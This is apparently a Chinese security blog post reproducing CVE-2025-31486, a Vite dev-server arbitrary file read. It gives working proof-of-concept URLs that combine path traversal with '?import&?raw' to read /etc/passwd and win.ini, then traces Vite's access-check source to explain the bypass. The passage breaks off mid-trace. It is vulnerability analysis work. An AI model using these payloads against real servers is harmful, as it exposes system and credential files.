<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Meteor_Kai">



    <meta name="description" content="Just Hack For Fun...">


    <meta name="keywords" content="Web exploits bring me great joy!">


<title>Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-31486) | Meteor_Kai</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-31486)</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 10, 2025&nbsp;&nbsp;19:26:28</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>其实上文（CVE-2025-31125）中所说的未公开POC是此处31486的一种。</p>
<p><code>svg</code>这种是可以打CVE-2025-31486的。在上一篇CVE的复现中我已经提到了，这里就不说了。</p>
<p>6.2.5修补了上述漏洞。</p>
<p>但是这里还有一种方法：</p>
<h2 id="bypass-ensureServingAccess权限校验"><a href="#bypass-ensureServingAccess权限校验" class="headerlink" title="bypass ensureServingAccess权限校验"></a>bypass ensureServingAccess权限校验</h2><p>这里先给出poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</span><br><span class="line"></span><br><span class="line">http://localhost:5173/iife/@fs/C:/Users/swordlight/main/sec/analyse/vite-6.2.4/?/../../../../../../../windows/win.ini?import&amp;raw</span><br></pre></td></tr></table></figure>

<p>在修复CVE-2024-45811时有引入ensureServingAccess对传入的url进行校验，这个poc就绕过了<code>ensureServingAccess</code>的校验从而使用raw语法成功读取到了文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</span><br></pre></td></tr></table></figure>

<img src="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/image-20250410181444770.png" class="" title="This is an example image">



<p>接下来我们看看流程！跟进一下<code>ensureServingAccesss</code>，只要<code>ensureServingAccess</code>为true即可绕过！</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureServingAccess</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">res</span>: <span class="title class_">ServerResponse</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">next</span>: <span class="title class_">Connect</span>.<span class="title class_">NextFunction</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileServingAllowed</span>(url, server)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileReadable</span>(<span class="title function_">cleanUrl</span>(url))) &#123;</span><br><span class="line">    <span class="keyword">const</span> urlMessage = <span class="string">`The request url &quot;<span class="subst">$&#123;url&#125;</span>&quot; is outside of Vite serving allow list.`</span></span><br><span class="line">    <span class="keyword">const</span> hintMessage = <span class="string">`</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;server.config.server.fs.allow.map((i) =&gt; <span class="string">`- <span class="subst">$&#123;i&#125;</span>`</span>).join(<span class="string">&#x27;\n&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`</span></span><br><span class="line"></span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">error</span>(urlMessage)</span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">warnOnce</span>(hintMessage + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    res.<span class="property">statusCode</span> = <span class="number">403</span></span><br><span class="line">    res.<span class="title function_">write</span>(<span class="title function_">renderRestrictedErrorHTML</span>(urlMessage + <span class="string">&#x27;\n&#x27;</span> + hintMessage))</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// if the file doesn&#x27;t exist, we shouldn&#x27;t restrict this path as it can</span></span><br><span class="line">    <span class="comment">// be an API call. Middlewares would issue a 404 if the file isn&#x27;t handled</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们要如何使其return一个true呢？发现只有一个isFileServingAllowed方法有机会！</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">configOrUrl</span>: <span class="title class_">ResolvedConfig</span> | <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">urlOrServer</span>: <span class="built_in">string</span> | <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> config = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? configOrUrl : urlOrServer.<span class="property">config</span></span><br><span class="line">  ) <span class="keyword">as</span> <span class="title class_">ResolvedConfig</span></span><br><span class="line">  <span class="keyword">const</span> url = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? urlOrServer : configOrUrl</span><br><span class="line">  ) <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!config.<span class="property">server</span>.<span class="property">fs</span>.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">isFileLoadingAllowed</span>(config, filePath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处的关键点其实在于：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">isFileLoadingAllowed</span>(config, filePath)</span><br></pre></td></tr></table></figure>

<p>跟进一下<code>fsPathFromUrl</code>看看</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">fsPathFromUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fsPathFromId</span>(<span class="title function_">cleanUrl</span>(url))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先清洗一下url再<code>fsPathFromId</code>一下。</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>cleanUrl</code>会使用正则处理url中的第一个<code>?</code>或者<code>#</code>开始的到结尾的部分进行移除。接着我们再看看<code>fsPathFromId</code>，它的作用是将一个模块 ID（通常来自 import 语句）转换为文件系统路径（filesystem path）。</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">FS_PREFIX</span> = <span class="string">`/@fs/`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">fsPathFromId</span>(<span class="params"><span class="attr">id</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> fsPath = <span class="title function_">normalizePath</span>(</span><br><span class="line">    id.<span class="title function_">startsWith</span>(<span class="variable constant_">FS_PREFIX</span>) ? id.<span class="title function_">slice</span>(<span class="variable constant_">FS_PREFIX</span>.<span class="property">length</span>) : id,</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fsPath[<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="variable constant_">VOLUME_RE</span>.<span class="title function_">test</span>(fsPath) ? fsPath : <span class="string">`/<span class="subst">$&#123;fsPath&#125;</span>`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释一下<code>normalizePath</code></p>
<ul>
<li>将路径中的反斜杠 <code>\</code> 替换为正斜杠 <code>/</code>（Windows 兼容）。</li>
<li>移除多余的 <code>/</code>（如 <code>a//b</code> → <code>a/b</code>）。</li>
<li>解析相对路径符号（如 <code>./</code> 或 <code>../</code>）。</li>
</ul>
<p>接下来我们看看isFileLoadingAllowed函数，它主要用于 <strong>检查某个文件路径是否被允许加载</strong>。</p>
<ul>
<li><p><strong><code>fs.strict</code><strong>：若为 <code>false</code>（非严格模式），</strong>直接允许加载所有文件</strong>（跳过后续检查）。</p>
</li>
<li><p>**<code>fsDenyGlob</code>**：一个匹配函数，检查文件路径是否命中黑名单（如敏感文件 <code>**/.env</code>、<code>**/node_modules/**</code>）。</p>
</li>
<li><p>**<code>safeModulePaths</code>**：一个 <code>Set</code> 集合，存放明确允许加载的路径（如项目源码目录）。</p>
</li>
<li><p>**<code>fs.allow</code>**：一个数组，包含允许的路径规则（如 <code>[&#39;/src&#39;, &#39;/public&#39;]</code>）。</p>
</li>
<li><p>**<code>isUriInFilePath</code>**：辅助函数，检查 <code>filePath</code> 是否在某个允许的路径下（如 <code>/src/utils.js</code> 匹配 <code>/src</code>）。</p>
</li>
</ul>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileLoadingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">config</span>: <span class="title class_">ResolvedConfig</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">filePath</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fs &#125; = config.<span class="property">server</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="title function_">fsDenyGlob</span>(filePath)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">safeModulePaths</span>.<span class="title function_">has</span>(filePath)) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们便是在此处返回true的！因为我们自己的根目录是被允许的！</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>但是通过目录验证后，后续的处理逻辑却又是使用我们原始的url进行处理。</p>
<h3 id="跟一边poc"><a href="#跟一边poc" class="headerlink" title="跟一边poc"></a>跟一边poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</span><br></pre></td></tr></table></figure>

<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  url = <span class="built_in">decodeURI</span>(<span class="title function_">removeTimestampQuery</span>(req.<span class="property">url</span>!)).<span class="title function_">replace</span>(</span><br><span class="line">    <span class="variable constant_">NULL_BYTE_PLACEHOLDER</span>,</span><br><span class="line">    <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">  )</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">next</span>(e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里什么都没remove掉，继续跟</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlWithoutTrailingQuerySeparators = url.<span class="title function_">replace</span>(</span><br><span class="line">        trailingQuerySeparatorsRE,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      )</span><br></pre></td></tr></table></figure>

<p>然后进入到if判断中：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>这里在<code>rawRE.test</code>便已经为<code>true</code>，那么就会进入<code>ensureServingAccess</code>判断。这时我们的url为<code>/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</code></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isFileServingAllowed</span>(url, server)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br></pre></td></tr></table></figure>

<p>经过<code>fsPathFromUrl</code>的<code>cleanurl</code>后url变成了<code>/@fs/usr/src/node_modules/vite/</code>。<code>fsPathFromId</code>可以理解为一种规范化，url还是上面那样。</p>
<p>接着进入了<code>isFileLoadingAllowed</code>方法，我们关注下面这段代码：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>检查某个文件路径是否被允许加载，我们跟进<code>allow</code>看看：</p>
<img src="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/image-20250410183106447.png" class="" title="This is an example image">



<p>继续跟进<code>allow</code></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">server</span>: <span class="title class_">ResolvedServerOptions</span> = &#123;</span><br><span class="line">  ..._server,</span><br><span class="line">  <span class="attr">fs</span>: &#123;</span><br><span class="line">    ..._server.<span class="property">fs</span>,</span><br><span class="line">    <span class="comment">// run searchForWorkspaceRoot only if needed</span></span><br><span class="line">    <span class="attr">allow</span>: raw?.<span class="property">fs</span>?.<span class="property">allow</span> ?? [<span class="title function_">searchForWorkspaceRoot</span>(root)],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">sourcemapIgnoreList</span>:</span><br><span class="line">    _server.<span class="property">sourcemapIgnoreList</span> === <span class="literal">false</span></span><br><span class="line">      ? <span class="function">() =&gt;</span> <span class="literal">false</span></span><br><span class="line">      : _server.<span class="property">sourcemapIgnoreList</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看这段<code>allow: raw?.fs?.allow ?? [searchForWorkspaceRoot(root)]</code></p>
<p>定义允许访问的文件系统路径列表（安全限制）。</p>
<ul>
<li>**<code>raw?.fs?.allow</code>**：如果用户显式配置了 <code>raw.fs.allow</code>，则直接使用。</li>
<li>**默认值 <code>[searchForWorkspaceRoot(root)]</code>**：若未配置，则自动搜索工作区根目录并设为唯一允许路径。<ul>
<li><code>searchForWorkspaceRoot(root)</code>：Vite 内部函数，从项目根目录（<code>root</code>）向上查找包含 <code>pnpm-workspace.yaml</code> 或 <code>lerna.json</code> 的目录（适用于 monorepo）。</li>
<li>返回的路径会被添加到 <code>fs.allow</code> 数组中（例如 <code>[&#39;/Users/your/project&#39;]</code>）。</li>
</ul>
</li>
</ul>
<p>那么网站的路径就是默认允许的！这也是我们的poc需要用网站路径的原因，他不能是随机的！！！</p>
<p>然后我们就通过了<code>ensureServingAccess</code>，url以最初的poc继续往下走：</p>
<p><code>http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</code></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      )</span><br></pre></td></tr></table></figure>

<p>毋庸置疑，通过了<code>isImportRequest</code>，然后进入：</p>
